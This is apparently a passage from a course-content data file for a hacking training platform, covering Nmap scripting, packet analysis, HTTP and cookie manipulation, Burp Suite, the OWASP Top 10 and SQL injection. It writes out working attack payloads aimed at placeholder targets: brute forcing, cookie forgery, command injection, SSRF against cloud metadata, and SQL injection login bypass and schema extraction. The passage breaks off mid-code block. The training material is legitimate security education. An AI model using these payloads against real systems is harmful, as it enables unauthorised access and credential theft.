nmap --script discovery <target_ip>
\`\`\`

**Targeted Vulnerability Checks:**
\`\`\`bash
# Check for the famous 'EternalBlue' (SMB) vulnerability
nmap -p 445 --script smb-vuln-ms17-0<target_ip>

# Check for 'Heartbleed' (SSL/TLS)
nmap -p 443 --script ssl-heartbleed <target_ip>

# Check for Shellshock (Web)
nmap -p 80 --script http-shellshock --script-args uri=/cgi-bin/test.cgi <target_ip>
\`\`\`

**Brute Force via NSE:**
\`\`\`bash
# Brute force FTP credentials
nmap -p 21 --script ftp-brute --script-args userdb=users.txt,passdb=pass.txt <target_ip>

# Brute force HTTP Basic Auth
nmap -p 80 --script http-brute <target_ip>
\`\`\`

**Advanced Script Management:**
\`\`\`bash
# Find scripts related to a specific keyword
ls /usr/share/nmap/scripts/ | grep -i "smb"

# Read the help documentation for a specific script
nmap --script-help http-title

# Update the NSE script database
sudo nmap --script-updatedb
\`\`\`

**Analyzing Script Output:**
\`\`\`bash
# Run a script with increased verbosity to see the details
nmap -p 443 --script ssl-cert -vv <target_ip>

# Debug a script if it's not working as expected
nmap -p 80 --script http-enum --script-trace <target_ip>
\`\`\`

**Combining Multiple Scripts:**
\`\`\`bash
# Run multiple related scripts at once
nmap -p 80 --script http-title,http-headers,http-methods,http-enum <target_ip>
\`\`\`

*Operative Drill:* Browse \`/usr/share/nmap/scripts/\`. Find a script you've never used, read its code, and explain to yourself how it detects a vulnerability. This is how you move from tool-user to tool-master.`,
              image: 'step-03.webp',
            },
            {
              title: 'Building a Professional Recon Workflow',
              instruction:
                `Elite HSociety operatives don't just run commands; they follow a repeatable, structured workflow that ensures no target is missed. This step teaches you to build a 'Recon Pipeline' that moves from wide discovery to deep exploitation.

**Step 1: Discover Live Hosts:**
\`\`\`bash
# Scan a subnet for live machines and save their IPs
nmap -sn <target_subnet> -oG - | awk '/Up$/{print $2}' > targets.txt

# Verify the count of targets discovered
wc -l targets.txt
\`\`\`

**Step 2: Rapid Port Mapping:**
\`\`\`bash
# Fast scan of all 65k ports on discovered targets
sudo nmap -p- --min-rate 5000 -iL targets.txt -oN all_ports.txt

# Extract the open ports into a comma-separated list
grep "open" all_ports.txt | cut -d "/" -f 1 | tr '\n' ',' | sed 's/,$//'
\`\`\`

**Step 3: Deep Enumeration Pipeline:**
\`\`\`bash
# Targeted scan using the ports found in the previous step
# (Example assuming ports 22,80,445 were found)
sudo nmap -sV -sC -p 22,80,445 -iL targets.txt -oA deep_recon
\`\`\`

**Automation & Scripting:**
\`\`\`bash
# A simple bash one-liner to check a list of IPs for port 80
for ip in $(cat targets.txt); do nc -zw1 $ip 80 && echo "$ip has HTTP open"; done

# Use 'masscan' for incredibly fast scans across massive ranges
# sudo masscan -p80,443 <target_subnet> --rate 1000
\`\`\`

**Cleaning and Formatting Data:**
\`\`\`bash
# Extract service versions for your final report
grep "open" deep_recon.nmap | awk '{print $1, $4, $5, $6}'

# Generate a list of unique web servers found
grep "http" deep_recon.nmap | grep "open" | awk '{print $4, $5}' | sort -u
\`\`\`

**Maintaining a Paper Trail:**
\`\`\`bash
# Log your terminal session to a file
script -a engagement_log.txt

# Take a screenshot of your most important findings
# (Always keep proof of your compromise!)
\`\`\`

*Final Challenge:* Create a bash script that takes a single IP address, finds all open ports, and then automatically runs the \`vuln\` script category against only those ports. Output the result to a file named \`VULN_REPORT.txt\`. Congratulations, Operative.`,
              image: 'step-04.webp',
            },
          ],
        },
        {
          id: 'room4',
          title: 'Packet Analysis',
          overview:
            "A hacker who cannot read traffic is blind. Packet analysis is the art of seeing through the noise and identifying the exact data that flows through the HSociety network. In this room, you will master Wireshark and Tshark, learning to extract credentials, analyze protocols, and reconstruct entire conversations from raw network captures.",
          estimatedMinutes: 35,
          steps: [
            {
              title: 'Wireshark: The Operative\'s X-Ray',
              instruction:
                `Wireshark is the industry-standard tool for microscopic network analysis. To train like a hacker is to understand that every bit in a packet has a purpose. Whether you're hunting for cleartext passwords or analyzing a custom C2 protocol, Wireshark is your X-Ray vision.

**Mastering the Tshark CLI:**
Professional HSociety operatives often work on remote servers without a GUI. \`tshark\` is the command-line equivalent of Wireshark.
\`\`\`bash
# Capture traffic on eth0 and show only HTTP hosts
sudo tshark -i eth0 -Y http -T fields -e http.host

# Read a PCAP file and count packets per protocol
tshark -r capture.pcap -z io,phs

# Extract all unique IP addresses from a capture
tshark -r capture.pcap -T fields -e ip.src -e ip.dst | tr '\t' '\n' | sort -u
\`\`\`

**Interface & Capture Control:**
\`\`\`bash
# List all available interfaces for capture
tshark -D

# Capture and save with a ring buffer (prevent disk filling)
sudo tshark -i eth0 -b duration:3600 -b files:24 -w rolling_capture.pcap

# Capture only a specific number of packets and then exit
tshark -c 100 -i eth0
\`\`\`

**Deep Protocol Dissection:**
\`\`\`bash
# See the 'EtherType' field in the Ethernet layer
tshark -r capture.pcap -T fields -e eth.type | head -n 10

# Identify the IP version and Header Length
tshark -r capture.pcap -T fields -e ip.version -e ip.hdr_len | head -n 10
\`\`\`

**Advanced Statistics:**
\`\`\`bash
# Show a summary of every TCP conversation in the capture
tshark -r capture.pcap -z conv,tcp

# Show DNS query statistics
tshark -r capture.pcap -z dns,tree
\`\`\`

**Operative Drills:**
\`\`\`bash
# Find the top 10 most frequent destination ports
tshark -r capture.pcap -T fields -e tcp.dstport | sort | uniq -c | sort -rn | head -n 10

# Identify packets with an unusually large 'Time-to-Live' (TTL)
tshark -r capture.pcap -Y "ip.ttl > 128"
\`\`\`

*Hacker's Insight:* In the "Packet Details" pane of Wireshark, the OSI layers are stacked from bottom to top. Always look at the **EtherType** field to see which Layer 3 protocol (like IPv4 or IPv6) is being carried.`,
              image: 'step-01.webp',
            },
            {
              title: 'Advanced Display Filters',
              instruction:
                `Display filters are your most powerful weapon in the war against noise. To become a hacker, you must be able to filter through millions of packets to find the 'needle in the haystack'—the one packet containing the password.

**Attack Detection Filters:**
\`\`\`bash
# Detect potential ARP Spoofing (Multiple MACs for one IP)
tshark -r capture.pcap -Y "arp.duplicate-address-frame"

# Detect a TCP SYN Flood (High volume of SYNs without ACKs)
tshark -r capture.pcap -Y "tcp.flags.syn == 1 and tcp.flags.ack == 0"

# Spot DNS Tunneling (Unusually long subdomains)
tshark -r capture.pcap -Y "dns.qry.name.len > 50"
\`\`\`

**Credential Hunting Filters:**
\`\`\`bash
# Find cleartext HTTP POST data (logins, passwords)
tshark -r capture.pcap -Y 'http.request.method == "POST" and http contains "pass"'

# Extract FTP credentials (USER and PASS commands)
tshark -r capture.pcap -Y "ftp.request.command == USER || ftp.request.command == PASS"
\`\`\`

**Logical Filter Combinations:**
\`\`\`bash
# Filter for HTTPS traffic excluding your own IP
tshark -r capture.pcap -Y "tcp.port == 443 and ip.addr != <remote_server_ip>"

# Show only DNS responses that took longer than 1 second
tshark -r capture.pcap -Y "dns.time > 1.0"
\`\`\`

**Custom Output Formatting:**
\`\`\`bash
# Extract the Source IP and HTTP Host into a CSV-like format
tshark -r capture.pcap -Y http -T fields -e ip.src -e http.host -E separator=,

# Extract SSL/TLS Server Names (SNI) to see what sites are being visited
tshark -r capture.pcap -Y tls.handshake.type==1 -T fields -e tls.handshake.extensions_server_name
\`\`\`

**Advanced TCP Analysis:**
\`\`\`bash
# Find packets with the 'RST' flag set (Connections being forcibly closed)
tshark -r capture.pcap -Y "tcp.flags.reset == 1"

# Identify TCP retransmissions (Indicates a poor or monitored connection)
tshark -r capture.pcap -Y "tcp.analysis.retransmission"
\`\`\`

*Training Task:* Create a Tshark filter that shows only traffic between your machine and \`<target_ip>\`, excluding any SSH or HTTP traffic. What protocols are left?`,
              image: 'step-02.webp',
            },
            {
              title: 'Following & Reconstructing Streams',
              instruction:
                `Raw packets are just fragments. To truly understand an engagement, an HSociety operative must reconstruct these fragments into a human-readable conversation. Following a stream allows you to see exactly what an attacker sent and what the server replied.

**Stream Reconstruction with Tshark:**
\`\`\`bash
# Follow the first TCP stream (Stream 0) and display in hex/ascii
tshark -r capture.pcap -z follow,tcp,ascii,0

# Reconstruct all HTTP objects (images, files) from a capture
tshark -r capture.pcap --export-objects http,./output_dir
\`\`\`

**Extracting File Data:**
\`\`\`bash
# Extract the raw payload of a specific TCP stream
tshark -r capture.pcap -q -z follow,tcp,raw,0 | tail -n +7 | xxd -r -p > reconstructed_file.bin

# Identify the type of an extracted file
file reconstructed_file.bin
\`\`\`

**Reconstructing Web Conversations:**
\`\`\`bash
# See the full HTTP request and response for a specific stream
tshark -r capture.pcap -Y "tcp.stream == 5" -V | grep -E "Hypertext|Method|Status"
\`\`\`

**Advanced Data Extraction:**
\`\`\`bash
# Extract every URL requested in the capture
tshark -r capture.pcap -Y http.request -T fields -e http.request.full_uri | sort -u

# Extract email addresses from SMTP traffic
tshark -r capture.pcap -Y "smtp" -T fields -e smtp.mail_from -e smtp.rcpt_to
\`\`\`

**Handling Encrypted Traffic:**
In the engagement, you may be given an RSA private key to decrypt traffic.
\`\`\`bash
# Decrypt SSL/TLS traffic using a private key file
tshark -r capture.pcap -o "tls.keys_list:0.0.0.0,443,http,server.key" -Y http
\`\`\`

**Conversation Analysis:**
\`\`\`bash
# Identify the longest TCP conversation in terms of bytes
tshark -r capture.pcap -z conv,tcp -q | sort -k 10 -rn | head -n 5
\`\`\`

*Operative Drill:* Capture your own login to a non-HTTPS test site (e.g., \`http://<vulnerable_test_site>\`). Use Tshark to reconstruct the stream. Can you find your username and password in the raw data?`,
              image: 'step-03.webp',
            },
            {
              title: 'DNS Analysis & Exfiltration Detection',
              instruction:
                `DNS is the only protocol that is almost never encrypted or blocked, making it the perfect vehicle for data exfiltration and C2 (Command & Control) communication. To become a hacker is to spot the 'noise' in the DNS logs.

**Hunting for Exfiltration:**
\`\`\`bash
# List all unique DNS queries and their frequency
tshark -r capture.pcap -T fields -e dns.qry.name | sort | uniq -c | sort -rn

# Identify unusually long subdomains (Classic exfiltration technique)
tshark -r capture.pcap -T fields -e dns.qry.name | awk '{ if (length($0) > 50) print $0 }'
\`\`\`

**Analyzing DNS Response Codes:**
\`\`\`bash
# Find all 'NXDOMAIN' responses (Indicates scanning or malware)
tshark -r capture.pcap -Y "dns.flags.rcode == 3"

# Count the types of DNS records requested (A, AAAA, MX, TXT)
tshark -r capture.pcap -T fields -e dns.qry.type | sort | uniq -c
\`\`\`

**Advanced DNS Inspection:**
\`\`\`bash
# Extract the 'TXT' record content from responses
tshark -r capture.pcap -Y "dns.txt" -T fields -e dns.txt

# Monitor for DNS queries to known malicious domains
tshark -r capture.pcap -Y 'dns.qry.name contains "<malicious_domain_ip>"'
\`\`\`

**Entropy & Anomaly Detection:**
\`\`\`bash
# Find subdomains with high character variety (Randomly generated)
tshark -r capture.pcap -T fields -e dns.qry.name | cut -d "." -f 1 | sort -u
\`\`\`

**Passive Network Discovery:**
\`\`\`bash
# Build a list of all hosts on the network by observing DNS queries
tshark -r capture.pcap -T fields -e ip.src -e dns.qry.name | sort -u
\`\`\`

**Drilling into Specific Queries:**
\`\`\`bash
# See the full details of a suspicious DNS packet
tshark -r capture.pcap -Y "frame.number == 1234" -V | grep -A 20 "Domain Name System"
\`\`\`

*Final Training Insight:* A hacker's greatest asset is the protocol everyone trusts. DNS, ICMP, and NTP are often overlooked, but in the hands of an HSociety operative, they are powerful tools for stealthy communication. Congratulations on completing Phase 3.`,
              image: 'step-04.webp',
            },
          ],
        },
      ],
    },

    // ── PHASE 4: WEB & BACKEND SYSTEMS (moduleId: 4, 6 rooms) ───────────────
    {
      id: 'phase4',
      title: 'Web & Backend Systems',
      codename: 'PHASE 4',
      color: PHASE_COLORS.phase4,
      rooms: [
        {
          id: 'room1',
          title: 'How the Web Works',
          overview:
            "Before you can dismantle a web application, you must understand the invisible architecture that supports it. To train like a hacker is to see the web not as a collection of pages, but as a series of stateless HTTP requests and responses. In this room, you will learn to intercept, read, and manipulate the raw data that flows between the browser and the HSociety backend.",
          estimatedMinutes: 35,
          steps: [
            {
              title: 'The Operative\'s Lens: Browser DevTools',
              instruction:
                `Every web attack starts with visibility. Browser DevTools is your first line of reconnaissance, allowing you to see exactly what the browser is hiding from the average user.

**1. Activating Surveillance:**
Open the target app (\`<target_ip>\`). Press \`F12\` or \`Ctrl+Shift+I\`. Navigate to the **Network** tab and reload with \`Ctrl+R\`.

**2. Analyzing the Traffic Stream:**
Each row in the Network tab is a 'packet' of information.
- **Method:** GET (Fetch data), POST (Send data), PUT (Update data).
- **Status:** 200 (Success), 403 (Forbidden), 404 (Not Found), 500 (Server Error).
- **Type:** document, script, xhr (API call).

**3. Inspecting Request Headers:**
\`\`\`http
GET /api/user/profile HTTP/1.1
Host: <target_ip>1
User-Agent: Mozilla/5.0 (HSociety Operative)
Cookie: session=hacker_session_123
\`\`\`

**4. Interrogating Response Headers:**
Click on a request and look at 'Response Headers'. These reveal the 'DNA' of the server.
\`\`\`http
Server: nginx/1.18.0
X-Powered-By: Express
Content-Security-Policy: default-src 'self'
\`\`\`

**5. Filtering for Secrets:**
Use the search bar in the Network tab to look for keywords like "token", "password", or "config".

**6. Manual XHR/Fetch Execution:**
Go to the **Console** tab and manually trigger a request to see how the server responds.
\`\`\`javascript
fetch('/api/status').then(res => res.json()).then(console.log);
\`\`\`

*Training Task:* Identify the \`Server\` header for \`<target_ip>\`. Does it reveal a specific version? Research if that version has any 'Zero-Day' or known exploits.`,
              image: 'step-01.webp',
            },
            {
              title: 'Mastering HTTP Headers & Fingerprinting',
              instruction:
                `To become an HSociety Hacker, you must learn to communicate with servers directly from the terminal. HTTP headers are the 'metadata' of the web; they contain the clues that lead to successful exploitation.

**Fingerprinting with Curl:**
\`\`\`bash
# Show full request and response with raw headers
curl -v http://<target_ip>1

# Fetch ONLY the response headers (The fastest way to fingerprint)
curl -I http://<target_ip>1

# Follow redirects (-L) and ignore SSL errors (-k)
curl -IkL https://<target_ip>1
\`\`\`

**Advanced Header Manipulation:**
\`\`\`bash
# Spoof the 'X-Forwarded-For' header to bypass IP restrictions
curl -H "X-Forwarded-For: 127.0.0.1" http://<target_ip>1/admin

# Use a custom 'Referer' to trick the server's logic
curl -e "http://<trusted_internal>" http://<target_ip>1/internal

# Send a specific 'Accept' header to find hidden API versions
curl -H "Accept: application/vnd.hsociety.v2+json" http://<target_ip>1/data
\`\`\`

**Identifying Security Posture:**
\`\`\`bash
# Check for the presence of 'Strict-Transport-Security' (HSTS)
curl -s -I http://<target_ip>1 | grep -i "Strict-Transport"

# Look for 'X-Frame-Options' to see if the site is vulnerable to Clickjacking
curl -s -I http://<target_ip>1 | grep -i "X-Frame"
\`\`\`

**Automated Header Auditing:**
\`\`\`bash
# Scan a list of internal domains for dangerous headers
for url in <app_internal> <api_internal> <dev_internal>; do curl -s -I $url | grep "Server"; done
\`\`\`

**Data Extraction via CLI:**
\`\`\`bash
# Extract only the 'Set-Cookie' values from a response
curl -s -I http://<target_ip>1 | grep "Set-Cookie"
\`\`\`

*Hacker's Strategy:* If you see \`X-Powered-By: PHP/5.5\`, you've just found a legacy system. Older versions of languages are riddled with documented vulnerabilities that are trivial for an HSociety operative to exploit.`,
              image: 'step-02.webp',
            },
            {
              title: 'Cookies, Sessions & State Manipulation',
              instruction:
                `HTTP is a 'stateless' protocol—it has no memory. Cookies are the 'IDs' that servers use to remember who you are. To train like a hacker is to understand how to steal, forge, and manipulate these IDs to gain unauthorized access.

**Cookie Inspection & Attributes:**
- **HttpOnly:** If set, JavaScript cannot see the cookie (Protects against XSS).
- **Secure:** Cookie is only sent over encrypted (HTTPS) connections.
- **SameSite:** Determines if cookies are sent with cross-site requests (CSRF protection).

**Interacting with Cookies via CLI:**
\`\`\`bash
# Capture cookies from a login attempt into a file
curl -c cookies.txt -d "user=hacker&pass=HSociety123" http://<target_ip>1/login

# Use the captured cookie file for subsequent authenticated requests
curl -b cookies.txt http://<target_ip>1/dashboard

# View the contents of your 'Cookie Jar'
cat cookies.txt
\`\`\`

**Advanced Session Testing:**
\`\`\`bash
# Decode a Base64-encoded cookie to reveal its contents
echo "dXNlcmlkPTEwMDE7cm9sZT1ndWVzdA==" | base64 -d

# Manually set a cookie value to test for 'Privilege Escalation'
curl -b "role=admin" http://<target_ip>1/admin_panel
\`\`\`

**Identifying Predictable Sessions:**
\`\`\`bash
# Collect multiple cookies to check for patterns
for i in {1..5}; do curl -s -I http://<target_ip>1 | grep "Set-Cookie"; done
\`\`\`

**JWT (JSON Web Token) Analysis:**
JWTs are modern cookies. They have three parts: \`header.payload.signature\`.
\`\`\`bash
# Extract and decode the payload of a JWT token
echo "eyJ1c2VyIjoiaGFja2VyIiwicm9sZSI6ImFkbWluIn0=" | base64 -d
\`\`\`

**Token Invalidation Drills:**
\`\`\`bash
# Test if a cookie still works AFTER logging out
curl -b "session=OLD_TOKEN" http://<target_ip>1/profile -I
\`\`\`

*Operative Insight:* If you find a cookie that isn't \`HttpOnly\`, any script running on the page can steal it. This is the 'Golden Ticket' for session hijacking.`,
              image: 'step-03.webp',
            },
            {
              title: 'Intercepting Traffic with Burp Suite',
              instruction:
                `Burp Suite is the 'Command Center' for web exploitation. It sits between your browser and the server, allowing an HSociety operative to pause, modify, and replay traffic at will. To become a hacker is to move beyond what the browser *wants* you to send.

**The Operative's Setup:**
1. Start Burp: \`burpsuite &\`.
2. Configure Proxy: \`127.0.0.1:8080\`.
3. Install the CA Certificate (Essential for HTTPS interception).

**1. Intercept & Modify (The Proxy):**
Toggle 'Intercept is ON'. Click a button in your browser. Watch the request pause in Burp. Change a \`price=100\` parameter to \`price=1\` and click 'Forward'.

**2. Replay & Fuzz (The Repeater):**
Right-click any request in 'HTTP History' and 'Send to Repeater'.
\`\`\`http
# In Repeater, try changing the ID to find other users (IDOR)
GET /api/users/1001 HTTP/1.1 -> 200 OK
GET /api/users/1002 HTTP/1.1 -> 200 OK (Data Leak!)
\`\`\`

**3. Automated Attacks (The Intruder):**
Use Intruder to brute-force passwords or fuzz for hidden directories.
\`\`\`bash
# Set payload positions with §
POST /login HTTP/1.1
username=admin&password=§password§
\`\`\`

**4. Decoding on the Fly (The Decoder):**
Paste hashes or encoded strings into the Decoder tab to reveal hidden data.
\`\`\`text
Input: %3cscript%3ealert(1)%3c/script%3e
Output: <script>alert(1)</script> (URL Decoded)
\`\`\`

**5. Comparing Responses (The Comparer):**
Send two different responses to Comparer to spot subtle differences in timing or content.

**6. Analyzing the Attack Surface (The Target Tab):**
Use the Site Map to build a visual tree of every folder and file discovered on \`<target_ip>\`.

*Training Task:* Capture a request to \`/api/profile\`. In Burp Repeater, change the \`GET\` method to \`POST\`. Does the server respond differently? Sometimes 'Hidden' APIs are only accessible via specific methods.`,
              image: 'step-04.webp',
            },
          ],
        },
        {
          id: 'room2',
          title: 'OWASP Top 10 Overview',
          overview:
            "The OWASP Top 10 is the definitive list of the most critical web security risks. As an HSociety operative, you must know these categories by heart. This room takes you beyond the definitions, showing you how to detect and demonstrate the impact of each vulnerability using professional tools and techniques.",
          estimatedMinutes: 35,
          steps: [
            {
              title: 'OWASP Categories 1-5: The Critical Front',
              instruction:
                `To train like a hacker is to understand the logic of failure. The first five categories of the OWASP Top 10 represent the most common and impactful flaws found in modern web applications.

**A01: Broken Access Control (The Logic Flaw):**
Users accessing data they shouldn't.
\`\`\`bash
# Test for IDOR (Insecure Direct Object Reference)
# Accessing user 1001's profile as user 1002
curl -b "session=trainee_1002" http://<target_ip>/api/users/1001

# Attempting to access the admin panel without admin privileges
curl -I -b "session=trainee_1002" http://<target_ip>/admin
\`\`\`

**A02: Cryptographic Failures (The Weak Vault):**
Sensitive data exposed due to poor encryption.
\`\`\`bash
# Check if the target is using outdated TLS versions
nmap --script ssl-enum-ciphers -p 443 <target_ip>

# Identify cleartext HTTP transmission of sensitive data
sudo tcpdump -A -ni any 'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)' | grep -i "pass"
\`\`\`

**A03: Injection (The Command Override):**
Untrusted data changing the logic of a command.
\`\`\`bash
# Test for basic SQL Injection in a search field
curl "http://<target_ip>/search?q=hpb'-- "

# Test for Command Injection (Executing system commands)
curl "http://<target_ip>/ping?host=127.0.0.1;whoami"
\`\`\`

**A04: Insecure Design (The Flawed Blueprint):**
Security failed at the drawing board.
\`\`\`bash
# Identify lack of rate limiting on a login endpoint
for i in {1..20}; do curl -s -I -X POST http://<target_ip>/login | grep "HTTP/1.1"; done
\`\`\`

**A05: Security Misconfiguration (The Open Window):**
Defaults left unchanged or debug modes enabled.
\`\`\`bash
# Check for common default files and directories
nmap -p 80 --script http-enum <target_ip>

# Trigger a 404 to see if the server leaks technology info
curl -s http://<target_ip>/nonexistent_path_12345 | grep -i "server"
\`\`\`

*Operative Drill:* Which of these five categories do you think is hardest to detect with automated scanners? Why does an HSociety operative provide more value than a tool?`,
              image: 'step-01.webp',
            },
            {
              title: 'OWASP Categories 6-10: The Hidden Seams',
              instruction:
                `The second half of the OWASP Top 10 covers more subtle, often structural weaknesses. To become a hacker is to spot the 'invisible' threads that hold a system together and pull them until the whole architecture unravels.

**A06: Vulnerable and Outdated Components:**
\`\`\`bash
# Grab headers to identify server and language versions
curl -I http://<target_ip>

# Search for known exploits for the identified versions
searchsploit "Nginx 1.18.0"
\`\`\`

**A07: Identification and Authentication Failures:**
\`\`\`bash
# Test for username enumeration (Check response timing or messages)
curl -d "user=admin&pass=1" http://<target_ip>/login -v
curl -d "user=fakeuser123&pass=1" http://<target_ip>/login -v

# Check if session tokens are rotated after login
curl -I http://<target_ip>/login
\`\`\`

**A08: Software and Data Integrity Failures:**
\`\`\`bash
# Inspect 'Serialized' data in cookies or hidden fields
echo "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjU6ImlzQWRtIjtCOjE7fQ==" | base64 -d
\`\`\`

**A09: Security Logging and Monitoring Failures:**
\`\`\`bash
# Check if your failed attempts are being blocked (Indicates monitoring)
# (Repeatedly try to access a restricted resource)
for i in {1..50}; do curl -s -o /dev/null -w "%{http_code}\n" http://<target_ip>/admin; done
\`\`\`

**A10: Server-Side Request Forgery (SSRF):**
The server fetching data on behalf of the attacker.
\`\`\`bash
# Trick the server into fetching internal metadata (Cloud targets)
curl "http://<target_ip>/view?url=http://169.254.169.254/latest/meta-data/"

# Scan internal ports via the vulnerable server
curl "http://<target_ip>/view?url=http://localhost:3306"
\`\`\`

**Combining Techniques for Demonstrable Impact:**
\`\`\`bash
# Use A10 (SSRF) to exploit A05 (Misconfiguration) on an internal service
curl "http://<target_ip>/view?url=http://internal-db:8080/phpmyadmin"
\`\`\`

*HSociety Insight:* SSRF (A10) is one of the most prized findings in cloud environments. It often allows an operative to steal IAM roles and gain full control over the infrastructure.`,
              image: null,
            },
            {
              title: 'Identifying OWASP Issues: The Operative\'s Checklist',
              instruction:
                `Theory is the map, but reconnaissance is the territory. As an HSociety operative, you must follow a systematic checklist to ensure every 'layer' of the OWASP Top 10 is tested against the target.

**Reconnaissance & Surface Mapping:**
\`\`\`bash
# 1. Map the directory structure and hidden files
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt

# 2. Identify all input points (Forms, URL params, Headers)
# (Use Burp Suite to build the Site Map)
\`\`\`

**Testing for Common Low-Hanging Fruit:**
\`\`\`bash
# 3. Check for Directory Listing (A05)
curl -I http://<target_ip>/uploads/

# 4. Check for 'Verbose' Error Messages (A05)
curl -X DELETE http://<target_ip>/api/user/1
\`\`\`

**Deep Manual Inspection:**
\`\`\`bash
# 5. Inspect every JS file for secrets or hardcoded endpoints (A02/A05)
curl -s http://<target_ip>/static/js/main.js | grep -E "key|secret|api"

# 6. Test for IDOR on every numeric ID found (A01)
# Change ?id=1 to ?id=2, ?id=0, ?id=-1, ?id=9999
\`\`\`

**Automated Vulnerability Probing:**
\`\`\`bash
# 7. Run a targeted 'Vuln' scan with Nmap scripts
nmap --script vuln -p 80,443 <target_ip>

# 8. Use 'nikto' for a comprehensive web server audit
nikto -h http://<target_ip>
\`\`\`

**Reporting & Evidence Gathering:**
\`\`\`bash
# 9. Document every HTTP status code that deviates from 200/404
# (302 redirects to admin pages are high-value clues!)

# 10. Save the raw request/response of your best finding
curl -v http://<target_ip>/api/admin/config > evidence_A01.txt 2>&1
\`\`\`

*Training Task:* Open the target application. Using only \`curl\`, find three different OWASP categories that the developers missed. Document your evidence as if you were writing a professional report.`,
              image: null,
            },
            {
              title: 'Remediation: The Defensive Mindset',
              instruction:
                `To train like a hacker is to also understand the cure. An HSociety operative doesn't just break things; they provide the solution. This is what separates a professional from a vandal.

**Secure Coding Patterns:**
\`\`\`javascript
// VULNERABLE: Direct SQL string concatenation (A03)
query = "SELECT * FROM users WHERE id = " + req.query.id;

// SECURE: Using Parameterized Queries
db.execute("SELECT * FROM users WHERE id = ?", [req.query.id]);
\`\`\`

**Access Control Logic:**
\`\`\`javascript
// VULNERABLE: No ownership check (A01)
const profile = db.findUser(req.params.id);

// SECURE: Verify requester owns the resource
if (req.user.id !== req.params.id && !req.user.isAdmin) {
    return res.status(403).send("Unauthorized");
}
\`\`\`

**Data Sanitization & Output Encoding:**
\`\`\`javascript
// VULNERABLE: Direct rendering of user input (XSS)
res.send("<h1>Hello " + req.query.name + "</h1>");

// SECURE: HTML Encoding output
res.send("<h1>Hello " + encodeHTML(req.query.name) + "</h1>");
\`\`\`

**Managing Secrets Properly:**
\`\`\`bash
# VULNERABLE: Hardcoding keys in code
# const API_KEY = "hs_123456789";

# SECURE: Using Environment Variables
# const API_KEY = process.env.HS_API_KEY;
\`\`\`

**Infrastructure Defenses:**
\`\`\`bash
# Implement a Web Application Firewall (WAF) rule to block common injections
# Example: Deny requests containing 'UNION SELECT'
\`\`\`

**Logging & Alerting (A09):**
\`\`\`bash
# Set up a 'Trap' (Honeytoken) for attackers
# Log any access to 'http://<target_ip>/admin/secret_config.bak'
\`\`\`

*Final Insight:* Security is a journey, not a destination. By understanding the OWASP Top 10, you have learned the 'rules of engagement' for the modern web. You are now ready to dive deep into specific exploit chains.`,
              image: null,
            },
          ],
        },
        {
          id: 'room3',
          title: 'SQL Injection',
          overview:
            "SQL Injection (SQLi) is the 'Skeleton Key' of web exploitation. It allows an HSociety operative to step past the front door and talk directly to the database. In this room, you will learn to dismantle queries from the inside out, bypassing authentication and extracting the crown jewels of the HSociety target: the user credentials.",
          estimatedMinutes: 45,
          steps: [
            {
              title: 'The Architecture of the Injection',
              instruction:
                `To train like a hacker is to understand the developer's assumptions. SQL Injection occurs when a program trusts user input too much, allowing that input to become part of the command itself.

**1. Dismantling the Query Logic:**
Imagine a login query: \`SELECT * FROM users WHERE user = '$USER' AND pass = '$PASS'\`.
If we provide \`admin' -- \` as the username, the query becomes:
\`\`\`sql
SELECT * FROM users WHERE user = 'admin' -- ' AND pass = '...'
\`\`\`
The \`-- \` comments out the password check. You are now logged in as admin.

**2. Testing for Structural Weakness:**
\`\`\`bash
# Trigger a syntax error with a single quote
curl "http://<target_ip>/api/products?id=1'"

# Check for potential 'Boolean' based injection
curl "http://<target_ip>/api/products?id=1 AND 1=1" # Returns data
curl "http://<target_ip>/api/products?id=1 AND 1=2" # Returns nothing
\`\`\`

**3. Identifying Database Technology:**
Different databases use different 'comment' characters and functions.
\`\`\`bash
# Check if it's MySQL/PostgreSQL (uses -- )
curl "http://<target_ip>/api/products?id=1 -- "

# Check if it's MS SQL Server (uses /* ... */)
curl "http://<target_ip>/api/products?id=1/*"
\`\`\`

**4. Fingerprinting via Version Functions:**
\`\`\`bash
# MySQL version check
curl "http://<target_ip>/api/products?id=1 UNION SELECT @@version,NULL"

# PostgreSQL version check
curl "http://<target_ip>/api/products?id=1 UNION SELECT version(),NULL"
\`\`\`

**5. Handling URL Encoding:**
Operatives must encode special characters to ensure they reach the database intact.
\`\`\`bash
# ' = %27, space = %20 or +, -- = %2d%20
curl "http://<target_ip>/api/products?id=1%27%20OR%201=1%2d%2d%20"
\`\`\`

**6. Error-Based Enumeration:**
\`\`\`bash
# Force the database to reveal information in the error message
curl "http://<target_ip>/api/products?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- "
\`\`\`

*Operative Drill:* Why is a 'Blind' SQL injection more difficult to exploit than an 'Error-Based' one? How does an HSociety operative use 'Time-Based' delays to extract data?`,
              image: null,
            },
            {
              title: 'Authentication Bypass & Credential Theft',
              instruction:
                `The first objective in any engagement is access. SQL Injection provides multiple paths to bypass the login screen. To become a hacker is to find the 'True' statement that opens the door.

**1. Classic 'OR' Payloads:**
\`\`\`bash
# Bypassing a standard login form
curl -d "user=' OR 1=1 -- &pass=anything" -X POST http://<target_ip>/login

# Using numeric comparisons for stealth
curl -d "user=' OR 9>1 #&pass=x" -X POST http://<target_ip>/login
\`\`\`

**2. Targeting Specific Accounts:**
\`\`\`bash
# Log in as the first user in the table (usually Admin)
curl -d "user=' OR 1=1 LIMIT 1 -- &pass=x" -X POST http://<target_ip>/login
\`\`\`

**3. Exploiting Username Enumeration:**
\`\`\`bash
# Check if 'admin' exists by observing the error message
curl -d "user=admin' AND (SELECT 1)=1 -- &pass=x" -X POST http://<target_ip>/login
\`\`\`

**4. Extracting the Schema (The Map):**
Once inside, we need to know where the passwords live.
\`\`\`bash
# List all table names in the current database
curl "http://<target_ip>/api/products?id=1 UNION SELECT table_name,NULL FROM information_schema.tables"
\`\`\`

**5. Finding the 'Users' Table Columns:**
\`\`\`bash
# Identify the column names for the 'users' table
curl "http://<target_ip>/api/products?id=1 UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'"
\`\`\`

**6. The Grand Finale: Dumping Hashes:**
\`\`\`bash
